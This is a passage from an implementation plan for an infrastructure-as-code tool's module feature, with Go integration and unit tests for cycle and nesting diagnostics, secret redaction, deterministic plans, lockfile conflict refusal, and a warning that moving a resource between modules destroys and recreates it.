		"modules/ping/module.yml": "modules:\n  - ../pong\nresources:\n  next:\n    type: module.pong\n",
		"modules/pong/module.yml": "modules:\n  - ../ping\nresources:\n  back:\n    type: module.ping\n",
	})

	r := run(t, dir, "plan", "dev")
	if r.ExitCode != 1 {
		t.Fatalf("plan exit = %d, want 1\n%s", r.ExitCode, r.combined())
	}
	chain := lineContaining(t, r.combined(), "->")
	if !strings.Contains(chain, "pong") {
		t.Errorf("the cycle chain %q does not mention the module in the middle of it", chain)
	}
	if n := strings.Count(chain, "ping"); n < 2 {
		t.Errorf("the cycle chain %q names `ping` %d times; a cycle diagnostic must SHOW the cycle "+
			"returning to where it started, not merely assert one exists", chain, n)
	}
}

// TestExcessiveModuleNestingIsItsOwnDiagnostic is the rest of Ruling 6: depth
// 32 and a cycle are different failures and must not be collapsed. Nothing
// here hard-codes either wording — the assertion is that the two summaries
// DIFFER, which is the property that matters and the one a shared diagnostic
// would break.
func TestExcessiveModuleNestingIsItsOwnDiagnostic(t *testing.T) {
	const depth = 40 // comfortably past the bound of 32 (spec §7.2)
	files := map[string]string{}
	for i := 0; i < depth; i++ {
		files[fmt.Sprintf("modules/n%d/module.yml", i)] = fmt.Sprintf(
			"modules:\n  - ../n%d\nresources:\n  deeper:\n    type: module.n%d\n", i+1, i+1)
	}
	files[fmt.Sprintf("modules/n%d/module.yml", depth)] = "resources: {}\n"

	dir := projectWithFiles(t, `
project: myapp
modules:
  - ./modules/n0
resources:
  net:
    type: test.network
    cidr: 10.0.0.0/16
  top:
    type: module.n0
`, files)

	r := run(t, dir, "plan", "dev")
	if r.ExitCode != 1 {
		t.Fatalf("plan exit = %d, want 1\n%s", r.ExitCode, r.combined())
	}
	requireContains(t, r.combined(), "32")

	// Build the cycle fixture again and compare summaries.
	cycleDir := projectWithFiles(t, `
project: myapp
modules:
  - ./modules/ping
resources:
  net:
    type: test.network
    cidr: 10.0.0.0/16
  first:
    type: module.ping
`, map[string]string{
		"modules/ping/module.yml": "modules:\n  - ../pong\nresources:\n  next:\n    type: module.pong\n",
		"modules/pong/module.yml": "modules:\n  - ../ping\nresources:\n  back:\n    type: module.ping\n",
	})
	cycle := run(t, cycleDir, "plan", "dev")

	depthSummary := firstDiagnosticLine(t, r.combined())
	cycleSummary := firstDiagnosticLine(t, cycle.combined())
	if depthSummary == cycleSummary {
		t.Errorf("nesting too deep and a module instantiating itself share one diagnostic (%q); one says "+
			"the nesting is too deep and the other says it never terminates, and a user acts on them "+
			"differently", depthSummary)
	}
}
```

**Check before running, and this fixture has a trap the others do not.** Amendment 8e
discovers any directory under the project root containing a `module.yml` and loads it
under its directory name with no `modules:` entry. This fixture writes 41 of them, so
all 41 are loaded.

Discovery populates the ROOT level only (`PLAN.md` §11.1), so all 41 land as root-level
names and a nested module file reaches its child through its own explicit `modules:`
entry — which is what this fixture writes, and why the chain works at all.

**The bound counts INSTANTIATIONS, not loads** (Amendment 12b). It counts how many
module boundaries you cross to reach a resource, so those 41 root-level loads are all
at depth 1 and none of them contributes: discovery alone can never exhaust the bound,
however many modules a project contains. A bound that counted loads would turn a
project's module COUNT into a compile failure — a limit no user could predict from
their own nesting — and Ruling 6 exists to stop unbounded recursion, which is
instantiation.

So run a two-deep version of this fixture first. It is the discrimination check: if
discovery alone trips the depth diagnostic, the bound is on the wrong axis, and that is
a Tasks 4-7 defect to report rather than a fixture to shrink.

#### 10.6 Sensitivity survives a module boundary

```go
// TestASensitiveAttributeInsideAModuleStaysRedacted. Exactly one redaction
// path exists, pkg/value.Format, and module expansion introduces a new way for
// a value to travel — through a caller's `inputs:` into a module's resource.
// A second path, or a value that escaped the first, is how a plaintext secret
// reached output in M2.
func TestASensitiveAttributeInsideAModuleStaysRedacted(t *testing.T) {
	const secret = "hunter2-do-not-print"
	dir := projectWithFiles(t, `
project: myapp
modules:
  - ./modules/db
resources:
  net:
    type: test.network
    cidr: 10.0.0.0/16
  primary:
    type: module.db
    network: ${net.id}
    secret: `+secret+`
`, map[string]string{"modules/db/module.yml": `
inputs:
  network:
    type: string
  secret:
    type: string
resources:
  store:
    type: test.database
    engine: postgres
    network: ${network}
    password: ${secret}
`})

	r := run(t, dir, "plan", "dev")
	if r.ExitCode != 2 {
		t.Fatalf("plan exit = %d, want 2\n%s", r.ExitCode, r.combined())
	}
	if strings.Contains(r.combined(), secret) {
		t.Errorf("the secret reached the command's output:\n%s", r.combined())
	}
	line := attrLine(t, r.Stdout, modHeader("test.database", []string{"primary"}, "store"), "password")
	if !strings.HasPrefix(line, "password: <sensitive>") {
		t.Errorf("password rendered as %q, want a redacted value", line)
	}

	// Apply, then check it did not leak through state inspection either.
	if a := run(t, dir, "apply", "dev", "--auto-approve"); a.ExitCode != 0 {
		t.Fatalf("apply exit = %d, want 0\n%s", a.ExitCode, a.combined())
	}
	show := run(t, dir, "state", "show", "dev", "module.primary.store")
	if show.ExitCode != 0 {
		t.Fatalf("state show exit = %d, want 0\n%s", show.ExitCode, show.combined())
	}
	if strings.Contains(show.combined(), secret) {
		t.Errorf("the secret reached `state show`:\n%s", show.combined())
	}
}
```

**Check before running:** the subcommand is `state show <environment> <address>`
(`internal/cli/state.go`), and it takes a canonical address (spec §5.2), so
`module.primary.store` resolves. Confirm with `grep -n "Use:" internal/cli/state.go`
and adjust the invocation, not the assertion.

#### 10.7 Plan determinism with modules (acceptance invariant 6)

```go
// TestPlanWithModulesIsDeterministic is acceptance invariant 6 under the one
// thing M5 adds that can break it: expansion order. Four instantiations of one
// module plus a network is five resources, and Go randomises map iteration per
// range — an expansion that leaves order to a map differs between runs with
// high probability over ten runs, and almost never over one.
func TestPlanWithModulesIsDeterministic(t *testing.T) {
	dir := projectWithFiles(t, `
project: myapp
modules:
  - ./modules/db
resources:
  net:
    type: test.network
    cidr: 10.0.0.0/16
  delta:
    type: module.db
    network: ${net.id}
  alpha:
    type: module.db
    network: ${net.id}
  charlie:
    type: module.db
    network: ${net.id}
  bravo:
    type: module.db
    network: ${net.id}
`, map[string]string{"modules/db/module.yml": dbModule})

	first := run(t, dir, "plan", "dev")
	if first.ExitCode != 2 {
		t.Fatalf("plan exit = %d, want 2\n%s", first.ExitCode, first.combined())
	}
	for i := 1; i < 10; i++ {
		again := run(t, dir, "plan", "dev")
		if again.Stdout != first.Stdout {
			t.Fatalf("run %d differs from run 0:\n--- run 0 ---\n%s\n--- run %d ---\n%s",
				i, first.Stdout, i, again.Stdout)
		}
	}

	// Sorted, not merely stable: a stable-but-unsorted order would pass the
	// loop above. The instantiations are declared delta, alpha, charlie,
	// bravo, so declaration order and sorted order differ.
	want := []string{
		modHeader("test.database", []string{"alpha"}, "store"),
		modHeader("test.database", []string{"bravo"}, "store"),
		modHeader("test.database", []string{"charlie"}, "store"),
		modHeader("test.database", []string{"delta"}, "store"),
	}
	at := 0
	for _, name := range want {
		i := strings.Index(first.Stdout[at:], name)
		if i < 0 {
			t.Fatalf("%s does not appear after the previous instantiation; operations are not sorted by "+
				"address:\n%s", name, first.Stdout)
		}
		at += i + len(name)
	}
}
```

#### 10.7a The `module.` type prefix, and what a local-only project must NOT leave behind

Two unrelated things that both belong to the integration surface.

```go
// TestAMalformedModuleTypeIsReported covers Amendment 8c's first two guards.
// They are TASK 2's to implement (Amendment 13b, `checkResourceType`); this
// asserts the user-visible half.
//
// Stage 2 rather than stage 5, because stage 2 holds the line number — and
// because at stage 5 `HasPrefix` would select a malformed `module.` type and
// then report that some module does not exist, a diagnostic about a
// consequence, naming a module name the user never wrote.
//
// `module.` with nothing after it, and a name containing a further dot. The
// second matters more than it looks: a caller names a top-level loaded module,
// never a path into one, so `module.db.store` is a user reaching for a
// resource inside a module and must be told that rather than silently
// resolving to nothing.
func TestAMalformedModuleTypeIsReported(t *testing.T) {
	for _, tc := range []struct{ name, typ, want string }{
		{"empty", "module.", "module."},
		{"dotted", "module.db.store", "module.db.store"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			dir := projectWithFiles(t, `
project: myapp
modules:
  - ./modules/db
resources:
  net:
    type: test.network
    cidr: 10.0.0.0/16
  bad:
    type: `+tc.typ+`
    network: ${net.id}
`, map[string]string{"modules/db/module.yml": dbModule})

			r := run(t, dir, "validate", "dev")
			if r.ExitCode != 1 {
				t.Fatalf("validate exit = %d, want 1\n%s", r.ExitCode, r.combined())
			}
			requireContains(t, r.combined(), tc.want)
			requireContains(t, r.combined(), "bad") // the resource, per §44: where
		})
	}
}

// TestALocalOnlyProjectWritesNoLockFileOrModuleCache is Amendment 10's
// negative space, and it is the assertion most likely to be skipped.
//
// modules.lock records the commit a remote tag resolved to (10b), and
// .infra/modules/ caches fetched sources. A project whose every source is a
// filesystem path has nothing to pin and nothing to fetch, so writing either
// would be noise a user has to reason about and — for modules.lock, which is
// meant to be committed — noise in their diff. A lock file listing no remotes
// is worse than absent: it suggests pinning is happening.
func TestALocalOnlyProjectWritesNoLockFileOrModuleCache(t *testing.T) {
	dir := projectWithFiles(t, `
project: myapp
modules:
  - ./modules/db
resources:
  net:
    type: test.network
    cidr: 10.0.0.0/16
  primary:
    type: module.db
    network: ${net.id}
`, map[string]string{"modules/db/module.yml": dbModule})

	if a := run(t, dir, "apply", "dev", "--auto-approve"); a.ExitCode != 0 {
		t.Fatalf("apply exit = %d, want 0\n%s", a.ExitCode, a.combined())
	}

	if _, err := os.Stat(filepath.Join(dir, "modules.lock")); !os.IsNotExist(err) {
		t.Errorf("modules.lock exists for a project with no remote sources (stat err = %v); a lock file "+
			"pinning nothing suggests pinning is happening", err)
	}
	if _, err := os.Stat(filepath.Join(dir, ".infra", "modules")); !os.IsNotExist(err) {
		t.Errorf(".infra/modules exists for a project that fetched nothing (stat err = %v)", err)
	}
}
```

`m5_modules_test.go` needs `"os"` and `"path/filepath"` for the second test.

**What is NOT here, and who owns it.** Amendment 10's remote-source behaviour — an
unpinned remote refused, `modules.lock` recording a resolved commit, the `git`
injection guards, `GIT_TERMINAL_PROMPT=0`, the cache lock — is Author D's Tasks 11-14,
and its integration coverage belongs with them. Two things I checked and am reporting
rather than acting on:

- **There is no `infra init` to update.** `CLAUDE.md` lists `init` as absent until
  M5-M7 and no scaffolding exists, so there is nothing to teach about `modules.lock`
  or `.infra/modules/`. When `init` lands it must gitignore `.infra/` and NOT gitignore
  `modules.lock` — a lock file is committed, a cache is not. Raising it now because
  the two look alike and the wrong call is silent.
- **`infra validate` reporting a moved tag is Author D's**, not mine. It needs the
  resolved-hash comparison from 10b, which does not exist outside their package. My
  DoD records it as theirs and does not tick it.

#### 10.7b A lockfile entry that disagrees is refused, and never quietly updated

Amendment 20c. `modules.lock` records what each git source resolved to, and the
property that makes it worth having is that an existing entry which disagrees is an
ERROR rather than an update. A lockfile that silently adopts whatever it finds records
history instead of enforcing anything — appearance without the property, inside the
feature built to prevent exactly that.

The comparison is keyed on **source AND ref**, which is what keeps a deliberate bump
ordinary:

| lock vs. configuration | outcome |
|---|---|
| ref differs from the recorded ref | a new entry. The user edited the pin; the key changed, so there is no conflict |
| same ref, different commit | **ERROR.** The ref moved underneath us, or the lock or cache was tampered with |
| same ref, same commit | left alone |

**What this test does and does not reach.** A *moved tag* is not reachable here and DoD
36c says why — it needs `ls-remote` against a live remote every run, and no hermetic
fixture can stand one up under the `https://` / `ssh://` / `git@` allowlist. What IS
reachable is Author D's no-server route (their 13.6): a **hash-pinned** source whose
cache entry is already present and valid skips the network entirely.

```go
// TestALockfileEntryThatDisagreesIsRefusedAndNotRewritten.
//
// READ THE NEXT PARAGRAPH BEFORE DELETING THIS TEST AS NONSENSICAL. For a
// hash-pinned source the scenario is degenerate on purpose: Commit always
// equals Ref, so a lock entry recording a different commit is one no correct
// run could ever have written. The test SUPPLIES that entry synthetically to a
// REAL mechanism — it exercises read-compare-refuse, and the
// byte-identical-afterward property, through the binary. That second half is
// the one no unit test reaches, because only the binary decides whether a
// command writes the file.
//
// A hash pin is used because it is the only git source reachable without a
// remote (Author D's 13.6: a valid cache entry skips the network). The
// alternative — a tag — would need a live server.
func TestALockfileEntryThatDisagreesIsRefusedAndNotRewritten(t *testing.T) {
	const (
		source = "https://example.invalid/repo"
		pinned = "1111111111111111111111111111111111111111" // what the source pins
		stale  = "2222222222222222222222222222222222222222" // what the lock claims
	)

	dir := projectWithFiles(t, `
project: myapp
modules:
  - `+source+`:`+pinned+`
resources:
  net:
    type: test.network
    cidr: 10.0.0.0/16
  primary:
    type: module.repo
    network: ${net.id}
`, map[string]string{
		// modules.lock, hand-written: source and ref match, commit does not.
		// Shape from internal/modules/source's Lockfile/Record.
		"modules.lock": `{
  "version": 1,
  "modules": [
    {
      "source": "` + source + `",
      "ref": "` + pinned + `",
      "commit": "` + stale + `"
    }
  ]
}
`,
	})
	// Commit == the pin, forced by the helper. So the cache CANNOT be the
	// source of the disagreement, which is what leaves modules.lock as the
	// only place one can live — and is why Amendment 20c's "hash pins get
	// lock entries too" is what makes this test possible at all.
	prepopulateCache(t, dir, source, pinned, map[string]string{"module.yml": dbModule})

	before, err := os.ReadFile(filepath.Join(dir, "modules.lock"))
	if err != nil {
		t.Fatalf("reading the fixture lockfile: %v", err)
	}

	r := run(t, dir, "validate", "dev")
	if r.ExitCode != 1 {
		t.Fatalf("validate exit = %d, want 1 — a lockfile entry recording a different commit for the "+
			"same source and ref must be refused, not adopted\n%s", r.ExitCode, r.combined())
	}
	out := r.combined()
	requireContains(t, out, source) // which module
	requireContains(t, out, stale)  // what the lock records
	requireContains(t, out, pinned) // what it resolves to now

	// THE ASSERTION THAT CARRIES THE PROPERTY. Everything above would also
	// pass against a command that reported the mismatch and then rewrote the
	// file — which is the failure being guarded, because it is silent and
	// leaves the user believing the lock enforced something.
	after, err := os.ReadFile(filepath.Join(dir, "modules.lock"))
	if err != nil {
		t.Fatalf("reading the lockfile after validate: %v", err)
	}
	if !bytes.Equal(before, after) {
		t.Errorf("validate rewrote modules.lock.\n--- before ---\n%s\n--- after ---\n%s", before, after)
	}
}

// TestEditingAPinIsNotALockfileConflict is the other half of the keying, and
// the half a user meets weekly. Bumping `:v1` to `:v2` — here, one hash to
// another — changes the REF, so it is a different key and a new entry rather
// than a conflict. Without this, the feature would refuse every deliberate
// upgrade and tell the user to delete a line they had just edited.
func TestEditingAPinIsNotALockfileConflict(t *testing.T) {
	const (
		source = "https://example.invalid/repo"
		oldPin = "1111111111111111111111111111111111111111"
		newPin = "3333333333333333333333333333333333333333"
	)

	dir := projectWithFiles(t, `
project: myapp
modules:
  - `+source+`:`+newPin+`
resources:
  net:
    type: test.network
    cidr: 10.0.0.0/16
  primary:
    type: module.repo
    network: ${net.id}
`, map[string]string{
		"modules.lock": `{
  "version": 1,
  "modules": [
    {
      "source": "` + source + `",
      "ref": "` + oldPin + `",
      "commit": "` + oldPin + `"
    }
  ]
}
`,
	})
	prepopulateCache(t, dir, source, newPin, map[string]string{"module.yml": dbModule})

	r := run(t, dir, "validate", "dev")
	if r.ExitCode != 0 {
		t.Fatalf("validate exit = %d, want 0 — the ref changed, so this is a different lockfile key and "+
			"a new entry, not a conflict\n%s", r.ExitCode, r.combined())
	}
	if strings.Contains(r.combined(), oldPin) {
		t.Errorf("the superseded pin was reported as a conflict:\n%s", r.combined())
	}
}
```

**The cache helper, and the three constraints it enforces.** `source.PrepopulateCache`
is Author D's (their step 13.6a). Do NOT recompute the cache path here: it is
`.infra/modules/<sha256(location)[:16]>/<ref>/`, and a local copy of that derivation
would keep passing after D changed it while silently testing nothing, because a cache
miss against `example.invalid` fails looking like an ordinary network error.

```go
// internal/modules/source
func PrepopulateCache(projectDir string, s Source, commit string, files map[string]string) error
```

It takes no `*testing.T`, so no production file imports `testing`. **Use D's wrapper
verbatim rather than writing a second one** — it is in their appendix and both suites
should share the one copy:

```go
func prepopulateCache(t *testing.T, dir, location, commit string, files map[string]string) {
	t.Helper()
	s, ds := source.Parse(location+":"+commit, value.Origin{})
	if ds.HasErrors() {
		t.Fatalf("parsing %q: %+v", location+":"+commit, ds)
	}
	if err := source.PrepopulateCache(dir, s, commit, files); err != nil {
		t.Fatalf("prepopulating the cache: %v", err)
	}
}
```

Three constraints, each refused by name inside the helper rather than left to produce a
confusing failure:

- **The entry must be pinned to a full 40-character hash**, and the `commit` passed must
  equal that pin. That is why both tests above use 40-hex constants and pass `pinned` /
  `newPin` as the commit.
- **A TAG pin cannot be prepopulated at all.** `Resolve` runs `ls-remote` for a tag on
  every resolve, so a prepopulated tag entry still needs a reachable remote — the thing
  this route exists to avoid, and the reason DoD 36c stays package-level.
- **`files` must contain `module.yml`.** An entry without it resolves fine and then
  fails at load with an error that reads as something else entirely.

`m5_modules_test.go` needs `"bytes"` for the byte-comparison, plus
`internal/modules/source` and `pkg/value` for the wrapper; it already has `"os"` and
`"path/filepath"` from 10.7a.

#### 10.8 Failing test: the note that says a rename destroys

Write the planner test first. Add to `internal/planner/render_test.go`:

```go
// TestRenderNotesAResourceThatMayHaveMovedBetweenModules is the second cost of
// flattening (spec §7.2), rendered where a user meets it.
//
// Addresses embed the module path, so moving a resource from one module to
// another renames it, and a rename is a destroy plus a create. The plan is the
// last thing a person reads before agreeing to that, and a destroy of
// `module.old.store` sitting next to a create of `module.new.store` with no
// connection drawn between them is how someone loses a database.
//
// The note is phrased as a possibility, not a claim: nothing here can know
// whether two resources sharing a type and a logical name are the same
// resource.
func TestRenderNotesAResourceThatMayHaveMovedBetweenModules(t *testing.T) {
	p := &Plan{
		Project:     "myapp",
		Environment: "dev",
		Operations: []Operation{
			{
				Address: address.Address{Module: []string{"new"}, Name: "store"},
				Type:    "test.database",
				Kind:    OpCreate,
				After:   map[string]value.Value{"engine": value.String("postgres", value.SourceExplicit)},
			},
			{
				Address: address.Address{Module: []string{"old"}, Name: "store"},
				Type:    "test.database",
				Kind:    OpDestroy,
				Before:  map[string]value.Value{"engine": value.String("postgres", value.SourceExplicit)},
			},
		},
	}

	out := Render(p, RenderOptions{})
	note := lineContainingInRender(t, out, "module.new.store")
	if !strings.Contains(note, "destroyed and recreated") {
		t.Errorf("the destroy carries no note about the rename:\n%s", out)
	}
	// On the destroy, not on the create: the create is not the dangerous half.
	destroyAt := strings.Index(out, "- test.database.module.old.store")
	if destroyAt < 0 || strings.Index(out, note) < destroyAt {
		t.Errorf("the note is not attached to the destroy operation:\n%s", out)
	}
}

func TestRenderDoesNotNoteUnrelatedDestroysAndCreates(t *testing.T) {
	// Different logical names, so nothing was moved. A note here would appear
	// on most plans that destroy anything, which is how a warning stops being
	// read.
	p := &Plan{
		Project:     "myapp",
		Environment: "dev",
		Operations: []Operation{
			{
				Address: address.Address{Module: []string{"new"}, Name: "cache"},
				Type:    "test.database",
				Kind:    OpCreate,
				After:   map[string]value.Value{"engine": value.String("postgres", value.SourceExplicit)},
			},
			{
				Address: address.Address{Module: []string{"old"}, Name: "store"},
				Type:    "test.database",
				Kind:    OpDestroy,
				Before:  map[string]value.Value{"engine": value.String("postgres", value.SourceExplicit)},
			},
		},
	}
	if out := Render(p, RenderOptions{}); strings.Contains(out, "destroyed and recreated") {
		t.Errorf("two unrelated resources were reported as a move:\n%s", out)
	}
}

// TestRenderDoesNotNoteADestroyWithNoMatchingCreate covers the two remaining
// shapes that RESEMBLE a move without being one. A warning that fires on
// ordinary destroys teaches people to skip it, and then it is not there for the
// one destroy that matters — which is a worse outcome than not having the
// warning at all.
func TestRenderDoesNotNoteADestroyWithNoMatchingCreate(t *testing.T) {
	destroy := Operation{
		Address: address.Address{Module: []string{"old"}, Name: "store"},
		Type:    "test.database",
		Kind:    OpDestroy,
		Before:  map[string]value.Value{"engine": value.String("postgres", value.SourceExplicit)},
	}

	for _, tc := range []struct {
		name string
		ops  []Operation
	}{
		{
			// The ordinary case: a plain destroy, nothing created at all.
			name: "nothing is created",
			ops:  []Operation{destroy},
		},
		{
			// Same logical name, same module move, DIFFERENT type. Two
			// resources of different types are not one resource that moved,
			// whatever they are called.
			name: "the created resource is a different type",
			ops: []Operation{
				{
					Address: address.Address{Module: []string{"new"}, Name: "store"},
					Type:    "test.network",
					Kind:    OpCreate,
					After:   map[string]value.Value{"cidr": value.String("10.0.0.0/16", value.SourceExplicit)},
				},
				destroy,
			},
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			out := Render(&Plan{Project: "myapp", Environment: "dev", Operations: tc.ops}, RenderOptions{})
			if strings.Contains(out, "destroyed and recreated") {
				t.Errorf("the move note fired on a destroy that only resembles a move:\n%s", out)
			}
		})
	}
}
```

`lineContainingInRender` does not exist yet — verified against HEAD, no planner test
file defines a helper of this shape. It is deliberately a SECOND copy of Task 10.1's
`lineContaining` rather than a shared one: that copy lives in `tests/integration` and a
Go test helper does not cross packages. Add this to `render_test.go`:

```go
// lineContainingInRender returns the single rendered line containing needle,
// failing if there is not exactly one. The count is the point: a note that
// appears twice is as wrong as one that never appears, and an assertion on
// "contains" alone would pass for both.
//
// This duplicates tests/integration's lineContaining (Task 10.1) because a
// test helper does not cross packages. If either grows a behaviour the other
// lacks, that is a signal the assertion moved, not that they should be merged.
func lineContainingInRender(t *testing.T, out, needle string) string {
	t.Helper()
	var found []string
	for _, l := range strings.Split(out, "\n") {
		if strings.Contains(l, needle) {
			found = append(found, l)
		}
	}
	if len(found) != 1 {
		t.Fatalf("want exactly one line containing %q, found %d:\n%s", needle, len(found), out)
	}
	return found[0]
}
```

`render_test.go` will need `"strings"` and
`"github.com/infrata/infrata/pkg/address"` if it does not already import them.

```bash
export PATH="$HOME/.local/share/mise/shims:$PATH"
go test -count=1 -run "TestRenderNotesAResource|TestRenderDoesNotNoteUnrelated" ./internal/planner/
```

The first fails (no note), the second passes (nothing notes anything yet).

#### 10.9 Minimal code: the note

In `internal/planner/render.go`, add:

```go
// moveCandidates maps a destroy operation's address to the addresses this same
// plan CREATES for a resource of the same type and the same logical name at a
// different module path.
//
// Spec §7.2: after stage 5 an address embeds its module path, so moving a
// resource between modules renames it, and a rename is a destroy plus a
// create. `state mv` is deferred past Phase 1 (§5.2), which makes the plan the
// only place this is visible before it happens.
//
// It is a heuristic and the rendered note says so. Nothing here can know
// whether two resources sharing a type and a logical name are the same
// resource; the note reports what the plan contains and what a rename does,
// and leaves the judgement to the reader. The cost of a false positive is one
// line of reading. The cost of a false negative is a database.
//
// Deterministic by construction: p.Operations is already sorted by address
// (spec §12.1), so the candidate lists come out sorted without a sort here.
// M3 measured eleven redundant sorts whose only job was undoing map iteration;
// this is not the twelfth.
func moveCandidates(p *Plan) map[string][]string {
	var creates []Operation
	for _, op := range p.Operations {
		if op.Kind == OpCreate {
			creates = append(creates, op)
		}
	}
	if len(creates) == 0 {
		return nil
	}
	out := map[string][]string{}
	for _, op := range p.Operations {
		if op.Kind != OpDestroy {
			continue
		}
		for _, c := range creates {
			if c.Type == op.Type && c.Address.Name == op.Address.Name &&
				c.Address.String() != op.Address.String() {
				out[op.Address.String()] = append(out[op.Address.String()], c.Address.String())
			}
		}
	}
	return out
}

// renderMoveWarning renders the note moveCandidates found, or "".
func renderMoveWarning(candidates []string) string {
	if len(candidates) == 0 {
		return ""
	}
	return fmt.Sprintf("    ⚠ Also created in this plan as %s. A resource's address includes its module "+
		"path, so moving one between modules renames it — and a renamed resource is destroyed and "+
		"recreated, not moved.", strings.Join(candidates, ", "))
}
```

Thread it through. In `Render`:

```go
	moves := moveCandidates(p)
	...
		lines = append(lines, renderOperationLines(op, moves[op.Address.String()], opts)...)
```

and in `renderOperationLines`:

```go
func renderOperationLines(op Operation, moveCandidates []string, opts RenderOptions) []string {
	...
	if op.Kind == OpDestroy || op.Kind == OpReplace {
		if warning := renderDependentsWarning(op); warning != "" {
			lines = append(lines, warning)
		}
	}
	if op.Kind == OpDestroy {
		if warning := renderMoveWarning(moveCandidates); warning != "" {
			lines = append(lines, warning)
		}
	}
```

`OpDestroy` only. A replacement is not a move — it is the same address, replaced in
place — and `OpForget` leaves the real resource alone, so neither carries the note.

#### 10.10 Run it, and check the goldens did not move

```bash
go test -count=1 ./internal/planner/
```

**No existing golden may change.** That is a checkable claim, not a hope: every
fixture in `internal/planner/testdata/` is root-level, and two root-level resources
with the same logical name would have the same address — so a root-only plan can never
contain both a destroy and a create that this function pairs. If a golden does move,
the pairing is wider than intended; investigate it, do not regenerate.

```bash
git diff --stat internal/planner/testdata/    # prints nothing
```

Commit:

```bash
git commit -m "M5 task 10: a plan notes that moving a resource between modules destroys it" -- \
  internal/planner/render.go internal/planner/render_test.go
```

#### 10.11 The same thing through the binary

Back in `tests/integration/m5_modules_test.go`:

```go
// TestMovingAResourceBetweenModulesDestroysAndRecreatesIt is spec §7.2's
// second cost, proved rather than asserted. The module instantiation is
// renamed from `old` to `new` and NOTHING else changes — same source, same
// inputs, same attributes — and the plan is a destroy and a create rather than
// a no-op. Documenting this in CLAUDE.md says it is true; this test is what
// makes the claim checkable, and the note is what puts it in front of the
// person about to approve it.
func TestMovingAResourceBetweenModulesDestroysAndRecreatesIt(t *testing.T) {
	const body = `
project: myapp
modules:
  - ./modules/db
resources:
  net:
    type: test.network
    cidr: 10.0.0.0/16
  %s:
    type: module.db
    network: ${net.id}
    size: 30
`
	dir := projectWithFiles(t, fmt.Sprintf(body, "old"), map[string]string{"modules/db/module.yml": dbModule})

	if a := run(t, dir, "apply", "dev", "--auto-approve"); a.ExitCode != 0 {
		t.Fatalf("apply exit = %d, want 0\n%s", a.ExitCode, a.combined())
	}
	if p := run(t, dir, "plan", "dev"); p.ExitCode != 0 {
		t.Fatalf("re-plan exit = %d, want 0 before the rename\n%s", p.ExitCode, p.combined())
	}

	writeIn(t, dir, "infra.yml", fmt.Sprintf(body, "new"))

	r := run(t, dir, "plan", "dev")
	if r.ExitCode != 2 {
		t.Fatalf("plan exit = %d, want 2 after the rename\n%s", r.ExitCode, r.combined())
	}
	requireContains(t, r.Stdout, "1 to create")
	requireContains(t, r.Stdout, "1 to destroy")
	requireContains(t, r.Stdout, modHeader("test.database", []string{"new"}, "store"))
	requireContains(t, r.Stdout, modHeader("test.database", []string{"old"}, "store"))

	// The user is told what happened, on the destroy, before they approve it.
	note := lineContaining(t, r.Stdout, "destroyed and recreated")
	if !strings.Contains(note, address.Address{Module: []string{"new"}, Name: "store"}.String()) {
		t.Errorf("the note %q does not name the address the resource is reappearing at", note)
	}

	// And it is not shown on a plan where nothing moved.
	unchanged := projectWithFiles(t, fmt.Sprintf(body, "old"), map[string]string{"modules/db/module.yml": dbModule})
	if u := run(t, unchanged, "plan", "dev"); strings.Contains(u.Stdout, "destroyed and recreated") {
		t.Errorf("a first plan with nothing to destroy carries the move note:\n%s", u.Stdout)
	}
}
```

**Check before running:** `writeIn` writes into an existing project directory, and the
fixture rewrites `infra.yml` in place. Confirm that is what `writeIn` does
(`grep -n "func writeIn" -A 10 tests/integration/m4_invariants_test.go`) rather than
assuming it refuses to overwrite.

#### 10.12 Run the suite

```bash
export PATH="$HOME/.local/share/mise/shims:$PATH"
go test -count=1 ./tests/integration/
```

`-count=1` matters most here: this package shells out to `go build` and Go's cache once
reported `ok ... (cached)` while production code was deliberately sabotaged.

Commit:

```bash
git add tests/integration/m5_modules_test.go
git commit -m "M5 task 10: integration suite for modules" -- tests/integration/m5_modules_test.go
```

#### 10.13 `CLAUDE.md` and `PLAN.md` §11

Three edits, all factual.

**`PLAN.md` §11 — already done upstream, verify rather than edit.** An earlier draft
of this step changed `value: service.endpoint` to `value: ${service.endpoint}`. §11 was
rewritten wholesale under Amendment 8 (commit `ef8ad57`) and already uses the `${...}`
form. Confirm and move on:

```bash
grep -n "value:" PLAN.md | sed -n '1,10p'   # every output value is ${...}
```

If any bare dotted output value survives in §11, fix it and say so; otherwise `PLAN.md`
is not touched by this task and drops out of the commit below.

**Current state.** Read the section before editing it rather than trusting this
paragraph — it has moved twice during M5 authoring. At the time of writing it records
M1-M3 merged, M4 complete on `m4-variables`, a package and line count, and an
"Absent until M5-M7" list whose first entry is modules.

Update it to record modules and compiler stage 5: `modules:` with `inputs:`,
`outputs:` and local relative `source:` paths; modules nesting, bounded at 32;
expansion into module-qualified addresses; `ScopeModuleDefault` populated, which
closes PLAN.md §7's chain — M4's own entry says the module-defaults rung was left
empty, and that sentence is now false. Refresh the line and package counts from
`gofmt -l . >/dev/null; find . -name '*.go' | xargs wc -l | tail -1` and
`go list ./... | wc -l` rather than estimating. Move modules off the absent list and
leave `explain`, `graph`, `discover`, `import` and reading a saved plan back on it.

Two things in that section NOT to touch, because M5 does not change either: the M4
paragraph's note that typed schemas validate the value that WINS its rung, and the
`--output` paragraph's split between a plan artifact and a report. If either has become
false, that is a finding to report, not a line to quietly edit while writing about
modules.

**A new bullet under "Key architectural rules", after the provenance one:**

```markdown
- **Addresses embed the module path, so moving a resource between modules
  destroys it.** Stage 5 flattens: after it, nothing downstream knows modules
  exist (spec §7.2). That simplification is paid for twice — `Origin.Module` is
  the only thing letting a diagnostic say which instantiation a problem came
  from, and an address is coupled to module structure, so renaming an
  instantiation or moving a resource between modules renames the resource, and
  a renamed resource is destroyed and recreated rather than moved. `state mv`
  is deferred past Phase 1 (§5.2). `infra plan` notes the destroy/create pair
  when it sees one (`moveCandidates` in `internal/planner/render.go`), which is
  the only warning a user gets; do not remove it without replacing it with
  something a user reads before typing `apply`.
```

```bash
git commit -m "M5 task 10: record module expansion and what it costs" -- CLAUDE.md
```

#### 10.14 Constraint checks

```bash
export PATH="$HOME/.local/share/mise/shims:$PATH"
go version                       # go1.24.x
gofmt -l .                       # prints nothing
go vet ./...
go test -count=1 ./...
go test -race -count=1 ./...

git diff --stat go.mod go.sum                                          # prints nothing: still cobra + yaml.v3
grep -rn '"<sensitive>"' --include=*.go . | grep -v _test.go           # only pkg/value/format.go
